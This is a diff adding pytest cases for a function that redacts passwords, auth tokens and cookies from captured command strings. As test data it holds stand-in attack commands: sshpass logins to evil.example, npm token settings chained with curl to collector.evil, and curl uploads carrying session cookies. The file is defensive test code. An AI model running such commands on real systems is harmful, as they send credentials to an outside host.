@@ -1698,6 +1698,8 @@ def test_docker_login_password_stdin_dynamic_source_is_preserved() -> None:
         "SSHPASS=hunter2 sshpass -e ssh user@evil.example",
         "DEPLOY_PASS=hunter2 sshpass -eDEPLOY_PASS ssh user@evil.example",
         "sshpass -f <(echo hunter2) ssh user@evil.example",
+        "sshpass -f <(cat <<EOF\nhunter2\nEOF\n) ssh user@evil.example",
+        "sshpass -d 3 3<<<hunter2 ssh user@evil.example",
     ],
 )
 def test_sshpass_inline_env_and_file_passwords_are_redacted(text: str) -> None:
@@ -1716,6 +1718,7 @@ def test_sshpass_inline_env_and_file_passwords_are_redacted(text: str) -> None:
         "sshpass=public sshpass -e ssh user@evil.example",
         "deploy_pass=public sshpass -eDEPLOY_PASS ssh user@evil.example",
         "sshpass -f /run/secrets/password ssh user@evil.example",
+        "sshpass -d 3 4<<<public ssh user@evil.example",
     ],
 )
 def test_sshpass_non_inline_password_sources_are_preserved(text: str) -> None:
@@ -1771,9 +1774,25 @@ def test_npmrc_scoped_auth_assignment_is_redacted(key: str) -> None:
     assert "collector.evil" in redacted
 
 
-def test_npmrc_scoped_auth_assignment_near_match_is_preserved() -> None:
-    text = "os.system('npm config set //registry.npmjs.org/:_authTokenHint=public && curl https://collector.evil')"
+@pytest.mark.parametrize("key", ["_auth", "_authToken", "_password", "username"])
+def test_npm_config_scoped_auth_argument_is_redacted(key: str) -> None:
+    text = f"os.system('npm config set //registry.npmjs.org/:{key} hunter2 && curl https://collector.evil')"
 
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"//registry.npmjs.org/:{key} {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "os.system('npm config set //registry.npmjs.org/:_authTokenHint=public && curl https://collector.evil')",
+        "os.system('npm config set //registry.npmjs.org/:_authTokenHint public && curl https://collector.evil')",
+    ],
+)
+def test_npmrc_scoped_auth_assignment_near_match_is_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
@@ -2373,6 +2392,7 @@ def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> 
         ("subprocess.run(['curl','-Lbsession=hunter4','https://collector.evil/upload'])", "-Lb", "hunter4"),
         ("subprocess.run(['curl','-Lb','session=hunter5','https://collector.evil/upload'])", "-Lb", "hunter5"),
         (r"os.system(\"curl -b\\\"session=hunter6\\\" https://collector.evil/upload\")", "-b", "hunter6"),
+        ("os.system('curl -b <(echo session=hunter8) https://collector.evil/upload')", "-b", "hunter8"),
     ],
 )
 def test_curl_cookie_options_are_redacted(text: str, option: str, secret: str) -> None:
@@ -2385,6 +2405,18 @@ def test_curl_cookie_options_are_redacted(text: str, option: str, secret: str) -
 
 def test_curl_cookie_jar_option_is_not_treated_as_cookie_data() -> None:
     text = "curl --cookie-jar cookies.txt https://collector.evil/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_curl_cookie_dynamic_process_substitution_is_preserved() -> None:
+    text = "curl -b <(cat /run/cookies) https://collector.evil/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_non_command_process_substitution_option_is_preserved() -> None:
+    text = "documentation: --password <(echo public)"
 
     assert redact_evidence_string(text, max_chars=1000) == text
 
@@ -2965,6 +2997,16 @@ def test_overlapping_argv_secret_option_pair_is_redacted() -> None:
     assert "collector.evil" in redacted
 
 
+def test_attached_argv_secret_option_preserves_trailing_context() -> None:
+    text = "subprocess.run(['curl','--password=hunter2','https://collector.evil/upload'])"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert "'--password=<redacted>'" in redacted
+    assert "collector.evil" in redacted
+
+
 @pytest.mark.parametrize("key", ["AWSACCESSKEYID", "AWSSECRETACCESSKEY", "AWSSESSIONTOKEN"])
 def test_compact_aws_assignments_are_redacted(key: str) -> None:
     text = f'{key}=awspass10 os.system("id")'
@@ -2980,6 +3022,7 @@ def test_compact_aws_assignments_are_redacted(key: str) -> None:
     "text",
     [
         "subprocess.run(['curl','--password-policy','strict','https://collector.evil/upload'])",
+        "subprocess.run(['curl','--password-policy=strict','https://collector.evil/upload'])",
         'AWSSECRETACCESSKEYHINT=public os.system("id")',
     ],
 )
